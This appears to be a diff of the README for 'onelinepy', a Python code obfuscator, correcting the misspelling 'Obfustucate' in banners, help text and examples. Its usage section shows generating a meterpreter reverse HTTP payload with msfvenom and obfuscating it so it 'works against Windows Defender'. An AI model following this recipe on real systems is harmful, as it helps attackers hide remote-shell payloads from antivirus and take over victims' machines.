@@ -19,18 +19,18 @@ onelinepy
 <b>              _ _                 </b>
 <b>  ___ ___ ___| |_|___ ___</b><font color="#FFE82C"><b> ___ _ _</b></font>
 <b> | . |   | -_| | |   | -_</b><font color="#FFE82C"><b>| . | | |</b></font><b>     </b><font color="#FFE82C"><b>Python</b></font>
-<b> |___|_|_|___|_|_|_|_|___</b><font color="#FFE82C"><b>|  _|_  |</b></font><b>     </b><font color="#729FCF"><b>Obfustucator</b></font>
+<b> |___|_|_|___|_|_|_|_|___</b><font color="#FFE82C"><b>|  _|_  |</b></font><b>     </b><font color="#729FCF"><b>Obfuscator</b></font>
 <b>                         </b><font color="#FFE82C"><b>|_| |___|</b></font>
 
 <b>usage: oneline.py [-h] [-m M] [-i I] [--script SCRIPT] [--code CODE] [--list] [--output OUTPUT]</b>
 
 <b>optional arguments:</b>
 <b>  -h, --help       show this help message and exit</b>
-<b>  -m M             Obfustucating Method (i.e, -m /one_line/base64)</b>
-<b>  -i I             Iterations For Obfustucation.</b>
-<b>  --script SCRIPT  File path of Python file to Obfustucate.</b>
-<b>  --code CODE      Python code to Obfustucate.</b>
-<b>  --list           List Obfustucating Methods.</b>
+<b>  -m M             Obfuscating Method (i.e, -m /one_line/base64)</b>
+<b>  -i I             Iterations For Obfuscation.</b>
+<b>  --script SCRIPT  File path of Python file to Obfuscate.</b>
+<b>  --code CODE      Python code to Obfuscate.</b>
+<b>  --list           List Obfuscating Methods.</b>
 <b>  --output OUTPUT  Output File.</b>
 </pre>
 
@@ -40,11 +40,11 @@ onelinepy
 
 `msfvenom --payload python/meterpreter_reverse_http LHOST=... LPORT=... > payload.txt`
 
-2. Obfustucate Payload
+2. Obfuscate Payload
 
-`onelinepy -m /one_line/base64 --script payload.txt -i 3 --output obfustucated_payload.txt`
+`onelinepy -m /one_line/base64 --script payload.txt -i 3 --output obfuscated_payload.txt`
 
-3. Profit! The Obfustucated Payload works against Windows Defender.
+3. Profit! The Obfuscated Payload works against Windows Defender.
 
 ### More Examples
 
@@ -56,16 +56,16 @@ onelinepy -m /one_line/base64 --script payload.py -i 3
 onelinepy -m /one_line/hex --code "print('HEX!')"
 ```
 
-### Obfustucation Method List
+### Obfuscation Method List
 
 <pre><b>              _ _                 </b>
 <b>  ___ ___ ___| |_|___ ___</b><font color="#FFE82C"><b> ___ _ _</b></font>
 <b> | . |   | -_| | |   | -_</b><font color="#FFE82C"><b>| . | | |</b></font><b>     </b><font color="#FFE82C"><b>Python</b></font>
-<b> |___|_|_|___|_|_|_|_|___</b><font color="#FFE82C"><b>|  _|_  |</b></font><b>     </b><font color="#729FCF"><b>Obfustucator</b></font>
+<b> |___|_|_|___|_|_|_|_|___</b><font color="#FFE82C"><b>|  _|_  |</b></font><b>     </b><font color="#729FCF"><b>Obfuscator</b></font>
 <b>                         </b><font color="#FFE82C"><b>|_| |___|</b></font>
 
 
-<b>  Obfustucators ( * = May cause Syntax Errors )</b>
+<b>  Obfuscators ( * = May cause Syntax Errors )</b>
 <b> -=============-</b>
 <b> 0</b>	<b>/one_line/hex</b>
 <b> 1</b>	<b>/one_line/base64</b>
